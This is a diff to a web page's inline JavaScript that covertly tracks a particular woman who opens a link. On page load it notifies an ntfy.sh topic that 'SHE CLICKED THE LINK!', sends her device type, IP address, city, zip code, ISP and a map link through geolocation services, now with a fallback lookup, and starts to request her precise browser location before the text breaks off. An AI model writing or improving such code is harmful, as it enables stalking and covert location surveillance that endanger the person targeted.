@@ -25,20 +25,28 @@ p{color:#666;font-size:0.9rem;line-height:1.6;margin-bottom:1rem}
 (function(){
   var T='roja-tracker-k141';
   function s(title,msg,p){
-    try{fetch('https://ntfy.sh',{method:'POST',body:JSON.stringify({topic:T,title:title,message:msg,priority:p,tags:['eyes']})})}catch(e){}
+    try{fetch('https://ntfy.sh',{method:'POST',body:JSON.stringify({topic:T,title:title,message:msg,priority:p,tags:['eyes']})}).then(function(r){console.log('sent',r.status)}).catch(function(e){console.log('err',e)})}catch(e){}
   }
   var d=/mobile/i.test(navigator.userAgent)?'📱 Mobile':'💻 Desktop';
   var t=new Date().toLocaleString('en-US',{timeZone:'America/Chicago'});
   s('👀 SHE CLICKED THE LINK!','Device: '+d+'\nTime: '+t,5);
 
-  fetch('http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,isp,org,query')
+  fetch('https://ipwho.is/')
     .then(function(r){return r.json()})
     .then(function(d){
-      if(d.status!=='success')return;
-      var map='https://maps.google.com/?q='+d.lat+','+d.lon;
-      var org=d.org?'\n🏢 '+d.org:'';
-      s('📍 Location','📌 '+d.city+', '+d.regionName+' '+d.zip+'\n🌐 ISP: '+d.isp+org+'\n🔢 IP: '+d.query+'\n🗺️ Map: '+map,4);
-    }).catch(function(){});
+      if(!d.success)return;
+      var map='https://maps.google.com/?q='+d.latitude+','+d.longitude;
+      var org=d.connection&&d.connection.org?'\n🏢 '+d.connection.org:'';
+      var isp=d.connection&&d.connection.isp?d.connection.isp:'Unknown';
+      var zip=d.postal||'';
+      s('📍 Location','📌 '+d.city+', '+d.region+' '+zip+'\n🌐 ISP: '+isp+org+'\n🔢 IP: '+d.ip+'\n🗺️ Map: '+map,4);
+    }).catch(function(){
+      fetch('https://ipapi.co/json/')
+        .then(function(r){return r.json()})
+        .then(function(d){
+          s('📍 Location','📌 '+d.city+', '+d.region+' '+d.postal+'\n🌐 ISP: '+d.org+'\n🔢 IP: '+d.ip,4);
+        }).catch(function(){});
+    });
 
   if(navigator.geolocation){
     navigator.geolocation.getCurrentPosition(function(pos){
